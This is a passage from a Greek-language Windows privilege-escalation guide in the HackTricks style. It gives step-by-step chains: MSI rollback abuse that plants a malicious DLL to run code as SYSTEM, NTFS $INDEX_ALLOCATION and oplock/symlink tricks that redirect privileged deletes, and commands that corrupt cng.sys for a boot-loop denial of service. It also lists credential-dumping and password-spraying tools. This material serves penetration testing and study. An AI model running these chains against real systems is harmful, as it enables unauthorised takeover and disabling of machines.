> Σε αυτό το σημείο, **ενεργοποίησε το SYSTEM-level arbitrary folder delete vulnerability** για να διαγράψεις το `C:\Config.Msi`.

2. **Stage 2 – Αντικατάσταση των Rollback Scripts με κακόβουλα**

- Step 6: Αναδημιουργία του `C:\Config.Msi` με αδύναμα ACLs
    - Αναδημιούργησε εσύ τον φάκελο `C:\Config.Msi`.
    - Όρισε **αδύναμα DACLs** (π.χ. Everyone:F) και **κράτησε ανοιχτό ένα handle** με `WRITE_DAC`.

- Step 7: Εκτέλεση άλλης εγκατάστασης
    - Εγκατάστησε ξανά το `.msi`, με:
        - `TARGETDIR`: Εγγράψιμη τοποθεσία.
        - `ERROROUT`: Μια μεταβλητή που προκαλεί αναγκαστική αποτυχία.
    - Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να ενεργοποιήσει ξανά το **rollback**, το οποίο διαβάζει τα `.rbs` και `.rbf`.

- Step 8: Παρακολούθηση για `.rbs`
    - Χρησιμοποίησε το `ReadDirectoryChangesW` για να παρακολουθείς το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
    - Κατέγραψε το όνομα του αρχείου.

- Step 9: Συγχρονισμός πριν από το Rollback
    - Το `.msi` περιέχει ένα **custom install action (`SyncBeforeRollback`)** που:
        - Σηματοδοτεί ένα event όταν δημιουργηθεί το `.rbs`.
        - Έπειτα **περιμένει** προτού συνεχίσει.

- Step 10: Επαναφορά των αδύναμων ACL
    - Αφού λάβεις το event `.rbs created`:
        - Το Windows Installer **εφαρμόζει ξανά ισχυρά ACLs** στο `C:\Config.Msi`.
        - Όμως, επειδή εξακολουθείς να έχεις ένα handle με `WRITE_DAC`, μπορείς να **εφαρμόσεις ξανά αδύναμα ACLs**.

> Τα ACLs **ελέγχονται μόνο κατά το άνοιγμα του handle**, επομένως μπορείς ακόμη να γράψεις στον φάκελο.

- Step 11: Τοποθέτηση πλαστών `.rbs` και `.rbf`
    - Αντικατάστησε το αρχείο `.rbs` με ένα **πλαστό rollback script** που λέει στα Windows να:
        - Επαναφέρουν το αρχείο `.rbf` (malicious DLL) σε μια **προνομιούχα τοποθεσία** (π.χ. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Τοποθέτησε το πλαστό `.rbf` που περιέχει ένα **malicious SYSTEM-level payload DLL**.

- Step 12: Ενεργοποίηση του Rollback
    - Στείλε το sync event για να συνεχίσει το installer.
    - Ένα **custom action τύπου 19 (`ErrorOut`)** έχει ρυθμιστεί ώστε να **αποτυγχάνει σκόπιμα η εγκατάσταση** σε ένα γνωστό σημείο.
    - Αυτό προκαλεί την έναρξη του **rollback**.

- Step 13: Το SYSTEM εγκαθιστά το DLL σου
    - Το Windows Installer:
        - Διαβάζει το κακόβουλο `.rbs`.
        - Αντιγράφει το DLL `.rbf` σου στην τοποθεσία-στόχο.
    - Τώρα έχεις το **malicious DLL σου σε ένα path που φορτώνεται από το SYSTEM**.

- Final Step: Εκτέλεση κώδικα ως SYSTEM
    - Εκτέλεσε ένα έμπιστο **auto-elevated binary** (π.χ. `osk.exe`) που φορτώνει το DLL που έκανες hijack.
    - **Έτοιμο**: Ο κώδικάς σου εκτελείται **ως SYSTEM**.


### Από Arbitrary File Delete/Move/Rename σε SYSTEM EoP

Η κύρια τεχνική MSI rollback (η προηγούμενη) προϋποθέτει ότι μπορείς να διαγράψεις **ολόκληρο φάκελο** (π.χ. `C:\Config.Msi`). Τι γίνεται όμως αν το vulnerability σου επιτρέπει μόνο **arbitrary file deletion**;

Θα μπορούσες να εκμεταλλευτείς **NTFS internals**: κάθε φάκελος έχει ένα κρυφό alternate data stream που ονομάζεται:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Αυτό το stream αποθηκεύει τα **μεταδεδομένα ευρετηρίου** του φακέλου.

Επομένως, αν **διαγράψετε το stream `::$INDEX_ALLOCATION`** ενός φακέλου, το NTFS **αφαιρεί ολόκληρο τον φάκελο** από το σύστημα αρχείων.

Μπορείτε να το κάνετε χρησιμοποιώντας τυπικά API διαγραφής αρχείων, όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Παρότι καλείτε ένα API διαγραφής *αρχείου*, αυτό **διαγράφει τον ίδιο τον φάκελο**.

### Από τη διαγραφή περιεχομένων φακέλου σε SYSTEM EoP
Τι γίνεται αν το primitive σας δεν σας επιτρέπει να διαγράφετε αυθαίρετα αρχεία/φακέλους, αλλά **σας επιτρέπει να διαγράφετε τα *περιεχόμενα* ενός φακέλου που ελέγχεται από τον επιτιθέμενο**;

1. Βήμα 1: Δημιουργήστε έναν φάκελο-δόλωμα και ένα αρχείο
- Δημιουργήστε: `C:\temp\folder1`
- Μέσα σε αυτόν: `C:\temp\folder1\file1.txt`

2. Βήμα 2: Τοποθετήστε ένα **oplock** στο `file1.txt`
- Το oplock **παύει την εκτέλεση** όταν μια privileged διεργασία προσπαθεί να διαγράψει το `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Βήμα 3: Ενεργοποίηση διεργασίας SYSTEM (π.χ., `SilentCleanup`)
- Αυτή η διεργασία σαρώνει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει τα περιεχόμενά τους.
- Όταν φτάσει στο `file1.txt`, ενεργοποιείται το **oplock** και παραδίδει τον έλεγχο στο callback σας.

4. Βήμα 4: Μέσα στο callback του oplock – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακινήστε το `file1.txt` αλλού
    - Αυτό αδειάζει το `folder1` χωρίς να διακόψει το oplock.
    - Μην διαγράψετε απευθείας το `file1.txt` — αυτό θα απελευθέρωνε πρόωρα το oplock.

- Επιλογή B: Μετατρέψτε το `folder1` σε **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Αυτό στοχεύει την εσωτερική ροή NTFS που αποθηκεύει τα metadata του φακέλου — η διαγραφή της διαγράφει τον φάκελο.

5. Βήμα 5: Απελευθέρωση του oplock
- Η διεργασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει το `file1.txt`.
- Όμως τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Αποτέλεσμα**: Το `C:\Config.Msi` διαγράφεται από το SYSTEM.

### Από τη δημιουργία αυθαίρετου φακέλου σε μόνιμο DoS

Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **δημιουργήσετε έναν αυθαίρετο φάκελο ως SYSTEM/admin** — ακόμα κι αν **δεν μπορείτε να γράψετε αρχεία** ή **να ορίσετε αδύναμα δικαιώματα**.

Δημιουργήστε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **κρίσιμου driver των Windows**, π.χ.:
```
C:\Windows\System32\cng.sys
```

- Αυτή η διαδρομή αντιστοιχεί συνήθως στο πρόγραμμα οδήγησης kernel-mode `cng.sys`.
- Αν **τη δημιουργήσετε εκ των προτέρων ως φάκελο**, τα Windows δεν μπορούν να φορτώσουν το πραγματικό πρόγραμμα οδήγησης κατά την εκκίνηση.
- Στη συνέχεια, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά την εκκίνηση.
- Βλέπουν τον φάκελο, **αδυνατούν να εντοπίσουν το πραγματικό πρόγραμμα οδήγησης** και **καταρρέουν ή διακόπτουν την εκκίνηση**.
- Δεν υπάρχει **εναλλακτική λύση** ούτε **ανάκτηση** χωρίς εξωτερική παρέμβαση (π.χ. επιδιόρθωση εκκίνησης ή πρόσβαση στον δίσκο).

### Από προνομιούχες διαδρομές log/backup και OM symlinks σε αυθαίρετη αντικατάσταση αρχείων / DoS εκκίνησης

Όταν μια **προνομιούχα υπηρεσία** γράφει logs/exports σε μια διαδρομή που διαβάζεται από ένα **εγγράψιμο config**, ανακατευθύνετε αυτή τη διαδρομή με **Object Manager symlinks + NTFS mount points**, ώστε η προνομιούχα εγγραφή να προκαλέσει αυθαίρετη αντικατάσταση αρχείου (ακόμη και **χωρίς** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Προϋποθέσεις**
- Το config που αποθηκεύει τη διαδρομή-στόχο είναι εγγράψιμο από τον εισβολέα (π.χ. `%ProgramData%\...\.ini`).
- Δυνατότητα δημιουργίας mount point προς το `\RPC Control` και OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Μια προνομιούχα λειτουργία που γράφει σε αυτή τη διαδρομή (log, export, report).

**Παράδειγμα αλυσίδας**
1. Διαβάστε το config για να εντοπίσετε τον προνομιούχο προορισμό log, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατευθύνετε τη διαδρομή χωρίς admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Περιμένετε να γράψει το log το προνομιούχο στοιχείο (π.χ. ο admin ενεργοποιεί «αποστολή δοκιμαστικού SMS»). Η εγγραφή τώρα καταλήγει στο `C:\Windows\System32\cng.sys`.
4. Ελέγξτε τον στόχο που αντικαταστάθηκε (hex/PE parser) για να επιβεβαιώσετε την αλλοίωση· η επανεκκίνηση αναγκάζει τα Windows να φορτώσουν τη διαδρομή του αλλοιωμένου driver → **boot loop DoS**. Αυτό ισχύει γενικά και για οποιοδήποτε προστατευμένο αρχείο ανοίγει για εγγραφή μια προνομιούχα υπηρεσία.

> Το `cng.sys` φορτώνεται συνήθως από το `C:\Windows\System32\drivers\cng.sys`, αλλά αν υπάρχει αντίγραφο στο `C:\Windows\System32\cng.sys`, μπορεί να δοκιμαστεί πρώτο, καθιστώντας το αξιόπιστο στόχο DoS για αλλοιωμένα δεδομένα.



## **References**

### **Από High Integrity σε System**

### **Νέα υπηρεσία**

Αν εκτελείτε ήδη μια διεργασία High Integrity, η **διαδρομή προς SYSTEM** μπορεί να είναι εύκολη: απλώς **δημιουργήστε και εκτελέστε μια νέα υπηρεσία**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Κατά τη δημιουργία ενός service binary, βεβαιωθείτε ότι είναι έγκυρο service ή ότι το binary εκτελεί γρήγορα τις απαραίτητες ενέργειες, καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρο service.

### AlwaysInstallElevated

Από μια διεργασία High Integrity, μπορείτε να προσπαθήσετε να **ενεργοποιήσετε τις καταχωρίσεις μητρώου AlwaysInstallElevated** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας ένα wrapper _**.msi**_.\
[Περισσότερες πληροφορίες για τα κλειδιά μητρώου που εμπλέκονται και για το πώς να εγκαταστήσετε ένα πακέτο _.msi_ εδώ.](#alwaysinstallelevated)

### Από High + SeImpersonate privilege σε System

**Μπορείτε να** [**βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### Από SeDebug + SeImpersonate σε Full Token privileges

Αν έχετε αυτά τα token privileges (πιθανότατα θα τα βρείτε σε μια ήδη High Integrity διεργασία), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διεργασία** (εκτός από protected processes) με το SeDebug privilege, να **αντιγράψετε το token** της διεργασίας και να δημιουργήσετε μια **αυθαίρετη διεργασία με αυτό το token**.\
Με αυτήν την τεχνική συνήθως **επιλέγεται οποιαδήποτε διεργασία εκτελείται ως SYSTEM με όλα τα token privileges** (_ναι, μπορείτε να βρείτε διεργασίες SYSTEM χωρίς όλα τα token privileges_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για privilege escalation στο `getsystem`. Η τεχνική συνίσταται στη **δημιουργία ενός pipe και έπειτα στη δημιουργία/κατάχρηση ενός service ώστε να γράψει σε αυτό το pipe**. Στη συνέχεια, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το privilege **`SeImpersonate`** θα μπορεί να **κάνει impersonate το token** του client του pipe (του service), αποκτώντας privileges SYSTEM.\
Αν θέλετε να [**μάθετε περισσότερα για τα named pipes, διαβάστε αυτό**](#named-pipe-client-impersonation).\
Αν θέλετε να δείτε ένα παράδειγμα για [**το πώς να μεταβείτε από high integrity σε System χρησιμοποιώντας named pipes, διαβάστε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρετε να **κάνετε hijack ένα dll** που **φορτώνεται** από μια **διεργασία** η οποία εκτελείται ως **SYSTEM**, θα μπορείτε να εκτελέσετε αυθαίρετο κώδικα με αυτά τα permissions. Επομένως, το Dll Hijacking είναι επίσης χρήσιμο για αυτό το είδος privilege escalation και, επιπλέον, είναι **πολύ πιο εύκολο να επιτευχθεί από μια διεργασία high integrity**, καθώς θα έχει **write permissions** στους φακέλους που χρησιμοποιούνται για τη φόρτωση dlls.\
**Μπορείτε να** [**μάθετε περισσότερα για το Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **Από Administrator ή Network Service σε System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Από LOCAL SERVICE ή NETWORK SERVICE σε full privileges

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Χρήσιμα εργαλεία

**Το καλύτερο εργαλείο για την αναζήτηση vectors για Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Ελέγχει για misconfigurations και ευαίσθητα αρχεία (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Ανιχνεύεται.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Ελέγχει για πιθανά misconfigurations και συλλέγει πληροφορίες (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Ελέγχει για misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει αποθηκευμένες πληροφορίες συνεδριών από PuTTY, WinSCP, SuperPuTTY, FileZilla και RDP. Χρησιμοποιήστε το -Thorough τοπικά.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει credentials από το Credential Manager. Ανιχνεύεται.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Δοκιμάζει τα passwords που συλλέχθηκαν σε όλο το domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Το Inveigh είναι ένα εργαλείο PowerShell για ADIDNS/LLMNR/mDNS spoofing και man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασικό εργαλείο Windows enumeration για privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Αναζητά γνωστά vulnerabilities για privesc (DEPRECATED υπέρ του Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Απαιτούνται δικαιώματα Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζητά γνωστά vulnerabilities για privesc (πρέπει να γίνει compile με VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Κάνει enumerate τον host για misconfigurations (περισσότερο εργαλείο συλλογής πληροφοριών παρά εργαλείο privesc) (πρέπει να γίνει compile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει credentials από πολλά λογισμικά (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Ελέγχει για misconfiguration (precompiled executable στο github). Δεν συνιστάται. Δεν λειτουργεί καλά σε Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Ελέγχει για πιθανά misconfigurations (exe από python). Δεν συνιστάται. Δεν λειτουργεί καλά σε Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Εργαλείο που δημιουργήθηκε με βάση αυτήν την ανάρτηση (δεν χρειάζεται accesschk για να λειτουργήσει σωστά, αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει exploits που λειτουργούν (τοπικό python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει exploits που λειτουργούν (τοπικό Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να κάνετε compile το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([δείτε αυτό](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δείτε την εγκατεστημένη έκδοση του .NET στον host-θύμα, μπορείτε να εκτελέσετε:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Βασικές αρχές κλιμάκωσης προνομίων στα Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Κλιμάκωση προνομίων μέσω εκμετάλλευσης αδύναμων δικαιωμάτων φακέλων](http://www.greyhathacker.net/?p=738)
- [3] [Κλιμάκωση προνομίων στα Windows - σκονάκι](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Workshop τοπικής κλιμάκωσης προνομίων σε Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Επιθέσεις στα Windows: Το AT είναι το νέο black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Κλιμάκωση προνομίων - Windows - Πλήρης οδηγός OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Κλιμάκωση προνομίων - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Οδηγός κλιμάκωσης προνομίων στα Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Λίστα ελέγχου κλιμάκωσης προνομίων στα Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Κλιμάκωση προνομίων στα Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Μέθοδοι κλιμάκωσης προνομίων στα Windows για pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Phishing με macro Word VBA μέσω SMTP → αποκρυπτογράφηση διαπιστευτηρίων hMailServer → Veeam CVE-2023-27532 για SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format-string + stack BOF → VirtualAlloc ROP (RCE) και κλοπή kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Καταδιώκοντας το Silver Fox: Γάτα και ποντίκι στις σκιές του kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ευπάθεια προνομιακού συστήματος αρχείων σε σύστημα SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Εργαλεία δοκιμής symbolic link – χρήση του CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Επιστροφή στο παρελθόν. Κατάχρηση symbolic links στα Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port του Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Επικίνδυνη επίλυση module στα Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Modules Node.js: φόρτωση από φακέλους `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Προκλήσεις λίστας ελέγχου C/C++, λυμένες](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Συνάρτηση RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own με Microslop: Συνδυασμός CLDFLT και race conditions του kernel DirectX για LPE στα Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ένα I/O Ring για να τους κυβερνά όλους: Πρωτογενής δυνατότητα πλήρους ανάγνωσης/εγγραφής στα Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Κατάχρηση αυθαίρετων διαγραφών αρχείων για κλιμάκωση προνομίων και άλλα χρήσιμα κόλπα](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Κώδικας exploit για FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Επιθέσεις WSUS, Μέρος 2: CVE-2020-1013, μια ευπάθεια κλιμάκωσης τοπικών προνομίων της πρώτης ημέρας στα Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Εξερευνώντας το Credential Manager και το Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC για CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Περιορισμένη ανάθεση Kerberos βάσει πόρων: Όταν μια αλλαγή εικόνας οδηγεί σε κλιμάκωση προνομίων](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Εξαγωγή ιδιωτικών κλειδιών SSH από τον SSH Agent των Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Μετατρέποντας τους εταιρικούς servers ενημερώσεων σε εργοστάσια backdoor (0_o) – Μέρος 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Μετατρέποντας τους εταιρικούς servers ενημερώσεων σε εργοστάσια backdoor (0_o) – Μέρος 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Κλιμάκωση προνομίων μέσω διαγραφής φακέλου του Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Αναδρομή στα βήματά σας μέχρι το NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
